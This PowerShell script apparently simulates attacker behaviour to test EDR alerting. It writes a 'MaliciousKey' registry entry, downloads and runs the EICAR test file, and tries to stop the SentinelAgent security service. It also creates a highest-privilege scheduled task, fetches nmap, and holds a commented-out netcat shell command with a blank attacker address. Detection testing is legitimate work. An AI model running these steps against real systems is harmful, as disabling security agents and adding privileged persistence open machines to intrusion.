#Variables for Adding reg key
$ErrorActionPreference = "SilentlyContinue"
$KeyPath = "HKCU:\Software\Adobe"
#Variables for Grabbing fake dangerous file
$url = "http://eicar.org/download/eircar.com.txt"
$url1 = "http://github.com/nmap/nmap/releases/latest/download/nmap-7.94-setup.exe"
$outputPath = "$env:USERPROFILE\Downloads\nmap-setup.exe"
$outputFile = "$env:TEMP\eicar.txt"
#Variables for removing files with a task and powershell
$scriptPath = "$env:USERPROFILE\Documents\FrenchieTest.ps1"
$downloadsPath = "$env:USERPROFILE\Downloads"
#Variables for running netcat command
$attackerIP = "" #MyownIP to make this safer
$attackerPort = ""
$ncCommand = ""





Get-ChildItem -Path $downloadsPath -Filter "phish_alert_sp2*" | Remove-Item -Force

$scriptContent | Out-File -FilePath $scriptPath -Force
#Scheduled Task parameters
$taskName = "Delete Phishing artifacts"
$taskDescription = "Delete files starting with ([A-Za-z0-9]+(_[A-Za-z0-9]+)+) from download folder\."
$trigger = New-ScheduledTaskTrigger -Daily -At 8:30AM
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "-File `"$scriptPath`""

New-Item -Path $KeyPath -Force
New-ItemProperty -Path $KeyPath -Name "MaliciousKey"

try {
    Invoke-WebRequest -Uri $url -OutFile $outputFile
    Write-Host "File downloaded to $outputFile"

    Start-Process -FilePath $outputFile -Wait

    Write-Host "Script Executed. Check EDR, muahahaha."
    }
    
catch {
    Write-Host "An Error occured: $_"
    }
finally {
    if (Test-Path $outputFile) {
        Remove-Item $outputFile -Force
        Write-Host "Cleanup Completed: File deleted"
     }
}
try {
    Stop-Service -Name "SentinelAgent" -Force -ErrorAction Stop
    Write-Host "Attempted to stop SentinelAgent service."
    }
catch {
    Write-Host "Failed to stop SentinelAgent service: $_"
    }
try {
    Register-ScheduledTask -TaskName $taskName -Trigger $trigger -Action $action -Description $taskDescription -RunLevel Highest -Force
    Write-Host "Scheduled task '$taskName' has been created."
    }
catch {
    Write-Host "Failed to create scheduled task."
    }
#Start-Process -FilePath "cmd.exe" -ArgumentList "\c", $ncCommand -NoNewWindow -PassThru
Invoke-WebRequest -Uri $url1 -OutFile $outputPath
#Write-Host "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
